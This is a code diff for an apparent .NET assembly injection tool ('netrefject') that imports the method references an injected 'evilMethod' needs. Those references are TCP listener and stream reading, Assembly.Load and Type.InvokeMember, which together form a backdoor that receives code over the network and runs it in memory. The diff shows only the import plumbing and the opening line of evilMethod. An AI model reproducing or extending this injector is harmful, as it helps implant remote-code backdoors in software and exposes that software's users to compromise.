@@ -16,6 +16,7 @@ namespace netrefject
     class Worker
     {
         Assembly a = null;
+        Dictionary<string, MethodReference> methods = new Dictionary<string, MethodReference>(); 
 
         public static void syntax()
         {
@@ -209,76 +210,99 @@ namespace netrefject
 
         private MethodReference getMethodImportBasedOnOperand (Instruction i, MethodDefinition m1){
             MethodReference md = null;
+            if (methods.Count == 0){
+                methods = populateMethodReferences(m1);
+            }
 
-            //Choose which method to import and Import here...
-            md = m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
+            md = methods[i.Operand.ToString()];
 
             return md;
         }
 
-        private void importEvilMethodClasses(MethodDefinition m1){
+        private Dictionary<string,MethodReference> populateMethodReferences(MethodDefinition m1){
+            Dictionary<string,MethodReference> methodRefs = new Dictionary<string, MethodReference>();
+            MethodReference mref = null;
+
             //Mui Importante: Import all your function references for your evilMethod here
-            m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
+            mref = m1.Module.Import(typeof(Console).GetMethod("WriteLine",new[] {typeof(string)}));
+            methodRefs.Add(mref.ToString(),mref);
 
             //TcpListener Constructor
-            m1.Module.Import(typeof(TcpListener).GetConstructor(
+            mref = m1.Module.Import(typeof(TcpListener).GetConstructor(
                 new[] {
                     typeof(System.Net.IPAddress),  
                     typeof(int)
                 })
             );
+            methodRefs.Add(mref.FullName,mref);
+
             //TcpListener.Start 
-            m1.Module.Import(typeof(TcpListener).GetMethod("Start",new[]{typeof(int)}));
+            mref = m1.Module.Import(typeof(TcpListener).GetMethod("Start",new[]{typeof(int)}));
+            methodRefs.Add(mref.FullName,mref);
+
             //TcpListener.AcceptTcpClient
-            m1.Module.Import(typeof(TcpListener).GetMethod("AcceptTcpClient"));
+            mref=m1.Module.Import(typeof(TcpListener).GetMethod("AcceptTcpClient"));
+            methodRefs.Add(mref.FullName,mref);
+
             //TcpListener.Stop
-            m1.Module.Import(typeof(TcpListener).GetMethod("Stop"));
+            mref = m1.Module.Import(typeof(TcpListener).GetMethod("Stop"));
+            methodRefs.Add(mref.FullName,mref);
 
             //TcpClient.GetStream
-            m1.Module.Import(typeof(TcpClient).GetMethod("GetStream"));
+            mref = m1.Module.Import(typeof(TcpClient).GetMethod("GetStream"));
+            methodRefs.Add(mref.FullName,mref);
 
             //BinaryReader Constructor (NetworkStream)
-            m1.Module.Import(typeof(BinaryReader).GetConstructor(
+            mref = m1.Module.Import(typeof(BinaryReader).GetConstructor(
                 new []{
                     typeof(NetworkStream)
                 })
             );
+            methodRefs.Add(mref.FullName,mref);
 
             //BinaryReader Constructor (MemoryStream)
-            m1.Module.Import(typeof(BinaryReader).GetConstructor(
-                new []{
-                    typeof(MemoryStream)
-                })
-            );            
+            //mref = m1.Module.Import(typeof(BinaryReader).GetConstructor(
+            //    new []{
+            //        typeof(MemoryStream)
+            //    })
+            //);     
+            //methodRefs.Add(mref.FullName,mref);       
 
             //BinaryReader.ReadInt32
-            m1.Module.Import(typeof(BinaryReader).GetMethod("ReadInt32"));
+            mref = m1.Module.Import(typeof(BinaryReader).GetMethod("ReadInt32"));
+            methodRefs.Add(mref.FullName,mref);
 
             //BinaryReader.ReadBytes
-            m1.Module.Import(typeof(BinaryReader).GetMethod("ReadBytes",new []{typeof(int)}));
+            mref = m1.Module.Import(typeof(BinaryReader).GetMethod("ReadBytes",new []{typeof(int)}));
+            methodRefs.Add(mref.FullName,mref);
 
             //Stream.Seek (BinaryReader.BaseStream.Seek)
-            m1.Module.Import(typeof(Stream).GetMethod("Seek",
+            mref = m1.Module.Import(typeof(Stream).GetMethod("Seek",
                 new []{
                     typeof(int),
                     typeof(SeekOrigin)
                 }
             ));
+            methodRefs.Add(mref.FullName,mref);
             
             //MemoryStream Constructor
-            m1.Module.Import(typeof(MemoryStream).GetConstructor(
+            mref = m1.Module.Import(typeof(MemoryStream).GetConstructor(
                 new[] {
                     typeof(byte[])
                 }
             ));
+            methodRefs.Add(mref.FullName,mref);
 
             //Assembly.Load
-            m1.Module.Import(typeof(Assembly).GetMethod("Load",new []{typeof(byte[])}));
+            mref = m1.Module.Import(typeof(Assembly).GetMethod("Load",new []{typeof(byte[])}));
+            methodRefs.Add(mref.FullName,mref);
+
             //Assembly.GetType
-            m1.Module.Import(typeof(Assembly).GetMethod("GetType",new []{typeof(string)}));
+            mref = m1.Module.Import(typeof(Assembly).GetMethod("GetType",new []{typeof(string)}));
+            methodRefs.Add(mref.FullName,mref);
 
             //Type.InvokeMember
-            m1.Module.Import(typeof(Type).GetMethod("InvokeMember",
+            mref = m1.Module.Import(typeof(Type).GetMethod("InvokeMember",
                 new[]{
                     typeof(string),
                     typeof(BindingFlags),
@@ -287,7 +311,11 @@ namespace netrefject
                     typeof(Object[])
                 }
             ));
+            methodRefs.Add(mref.FullName,mref);
+
+            return methodRefs;
         }
+
         private void evilMethod()
         {
             Console.WriteLine("[!!] I am evilMethod starting");
